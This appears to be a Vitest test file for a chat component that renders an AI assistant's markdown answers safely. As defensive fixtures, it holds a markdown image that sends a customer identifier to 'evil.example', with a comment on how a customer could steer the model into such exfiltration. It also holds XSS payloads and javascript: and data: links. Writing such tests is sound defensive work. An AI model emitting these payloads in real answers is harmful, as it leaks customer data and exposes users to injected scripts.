// @vitest-environment jsdom
import { darkTheme, lightTheme } from '@strapi/design-system';
import { screen, within } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { MarkdownBody } from '../../admin/src/components/assistant/MarkdownBody';
import { renderInTheme } from './render';

/**
 * The CSS styled-components wrote for an element: every rule in the document that starts with one of the element's classes. The
 * document keeps the CSS of earlier tests, so a test reads only what its own element was drawn with.
 */
const cssOf = (element: Element): string => {
  const all = Array.from(document.querySelectorAll('style'))
    .map((style) => style.textContent ?? '')
    .join('\n');
  const classes = Array.from(element.classList);
  return all
    .split('}')
    .filter((rule) => classes.some((name) => rule.trimStart().startsWith(`.${name}`)))
    .map((rule) => `${rule}}`)
    .join('\n');
};

const draw = (text: string, options?: { dark?: boolean }) => {
  const view = renderInTheme(<MarkdownBody text={text} />, options);
  return { ...view, body: view.container.querySelector('[data-message-part="text"]') as HTMLElement };
};

describe('MarkdownBody', () => {
  it('draws paragraphs, bold text, lists and headings', () => {
    const { body } = draw('## Waiting\n\nThree **visits** wait.\n\n- APT-4821\n- APT-4822\n\n1. First\n2. Second');
    expect(within(body).getByRole('heading', { level: 2, name: 'Waiting' })).toBeTruthy();
    expect(body.querySelector('strong')?.textContent).toBe('visits');
    expect(Array.from(body.querySelectorAll('ul li')).map((item) => item.textContent)).toEqual(['APT-4821', 'APT-4822']);
    expect(Array.from(body.querySelectorAll('ol li')).map((item) => item.textContent)).toEqual(['First', 'Second']);
  });

  it('draws a table, which is what the assistant is told to use for items with the same fields', () => {
    const { body } = draw(
      ['| Reference | Customer | Status |', '| --- | --- | --- |', '| APT-4821 | line:U4af…88 | requested |', '| APT-4822 | line:Ub12…09 | confirmed |'].join('\n')
    );
    const table = within(body).getByRole('table');
    expect(within(table).getAllByRole('columnheader').map((cell) => cell.textContent)).toEqual(['Reference', 'Customer', 'Status']);
    expect(within(table).getAllByRole('row')).toHaveLength(3);
    expect(within(table).getByRole('cell', { name: 'line:Ub12…09' })).toBeTruthy();
  });

  it('draws code, a quote, a struck-out word and a task list, which remark-gfm adds', () => {
    const { body } = draw('Use `list_requests`.\n\n```\nline 1\n```\n\n> quoted\n\n~~old~~\n\n- [x] done\n- [ ] open');
    expect(body.querySelector('p code')?.textContent).toBe('list_requests');
    expect(body.querySelector('pre code')?.textContent).toBe('line 1\n');
    expect(body.querySelector('blockquote')?.textContent?.trim()).toBe('quoted');
    expect(body.querySelector('del')?.textContent).toBe('old');
    expect(body.querySelectorAll('input[type="checkbox"]')).toHaveLength(2);
  });

  // The model reads customer text, so a customer could ask it for an image whose address carries another customer's words.
  it('does not draw an image: nothing is fetched, and nothing is left where it was', () => {
    const { body } = draw('Before ![the strap](https://evil.example/pixel.png?d=line:U4af…88) after');
    expect(body.querySelector('img')).toBeNull();
    expect(body.textContent).toContain('Before');
    expect(body.textContent).toContain('after');
    expect(body.innerHTML).not.toContain('evil.example');
  });

  it('shows raw HTML as text and never as HTML: no element, no handler, no script', () => {
    const { body } = draw('<img src=x onerror="alert(1)"> and <script>alert(2)</script> and <b>bold</b>');
    // The only element in the answer is its paragraph: what looks like HTML is text inside it.
    expect(Array.from(body.querySelectorAll('*')).map((element) => element.tagName)).toEqual(['P']);
    expect(body.textContent).toBe('<img src=x onerror="alert(1)"> and <script>alert(2)</script> and <b>bold</b>');
  });

  it('draws an http or https link that opens in a new tab and keeps the window to itself', () => {
    const { body } = draw('[Care guide](https://example.com/care) and [plain](http://example.com)');
    const [care, plain] = Array.from(body.querySelectorAll('a'));
    expect(care.getAttribute('href')).toBe('https://example.com/care');
    expect(care.getAttribute('target')).toBe('_blank');
    expect(care.getAttribute('rel')).toBe('noopener noreferrer');
    expect(care.textContent).toBe('Care guide');
    expect(plain.getAttribute('href')).toBe('http://example.com/');
    expect(plain.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('draws a bare address as a link, which remark-gfm makes of it, with the same rules', () => {
    const { body } = draw('See https://example.com/care today.');
    const link = body.querySelector('a');
    expect(link?.getAttribute('href')).toBe('https://example.com/care');
    expect(link?.getAttribute('target')).toBe('_blank');
  });

  it.each([
    ['javascript:alert(1)'],
    ['JavaScript:alert(1)'],
    ['data:text/html;base64,PHNjcmlwdD4='],
    ['mailto:staff@example.com'],
    ['tel:+81312345678'],
    ['ftp://example.com/file'],
    ['/relative/path'],
    ['#anchor'],
    ['//example.com/protocol-relative'],
  ])('shows the text of a link to %s as plain text, with no link', (href) => {
    const { body } = draw(`Before [the label](${href}) after`);
    expect(body.querySelector('a')).toBeNull();
    expect(body.textContent).toBe('Before the label after');
  });

  it('keeps the node react-markdown hands to its components off the element', () => {
    const { body } = draw('[Care](https://example.com)');
    const link = body.querySelector('a') as HTMLAnchorElement;
    expect(link.hasAttribute('node')).toBe(false);
    expect(link.outerHTML).not.toContain('[object Object]');
    expect(Array.from(link.attributes).map((attribute) => attribute.name).sort()).toEqual(['href', 'rel', 'target']);
  });

  it('is the text of the answer only, so a check can read it apart from the rest of the message', () => {
    const { body } = draw('Hello');
    expect(body.getAttribute('data-message-part')).toBe('text');
  });

  it('draws an empty answer as nothing', () => {
    const { body } = draw('');
    expect(body.textContent).toBe('');
  });

  describe('wide content', () => {
    it('scrolls a wide table sideways inside its bubble: the table is a block with its own overflow, so it never widens the chat', () => {
      const { body } = draw('| a | b |\n| - | - |\n| 1 | 2 |');
      expect(cssOf(body)).toMatch(/ table\{[^}]*overflow-x:auto;display:block;\}/);
    });

    it('keeps a long line of code inside the bubble, with a scroll of its own', () => {
      const { body } = draw('```\n' + 'x'.repeat(300) + '\n```');
      expect(cssOf(body)).toMatch(/ pre\{[^}]*overflow-x:auto;/);
    });
  });

  describe('colours', () => {
    it('are the theme, never a black overlay: code, code blocks and table headers show in the dark theme too', () => {
      const { body } = draw('`code`\n\n| a |\n| - |\n| b |', { dark: true });
      const css = cssOf(body);
      expect(css).not.toMatch(/rgba\(/);
      expect(css).toContain(`code{font-size:0.85em;padding:1px 4px;border-radius:3px;background:${darkTheme.colors.neutral150};}`);
      expect(css).toContain(`th{background:${darkTheme.colors.neutral150};font-weight:600;}`);
      expect(css).toContain(`border-left:3px solid ${darkTheme.colors.neutral300}`);
      expect(css).not.toContain(lightTheme.colors.neutral150);
    });

    it('follow the light theme in the light theme', () => {
      const { body } = draw('`code`\n\n| a |\n| - |\n| b |');
      const css = cssOf(body);
      expect(css).toContain(`th{background:${lightTheme.colors.neutral150};font-weight:600;}`);
      expect(css).not.toContain(darkTheme.colors.neutral150);
    });

    it('give lists their markers and headings their weight, which the design system takes away', () => {
      const { body } = draw('# Title\n\n- one');
      const css = cssOf(body);
      expect(css).toMatch(/ ul\{list-style:disc;\}/);
      expect(css).toMatch(/ ol\{list-style:decimal;\}/);
      expect(css).toMatch(/h1,[^{]*h4\{[^}]*font-weight:600;/);
    });
  });
});
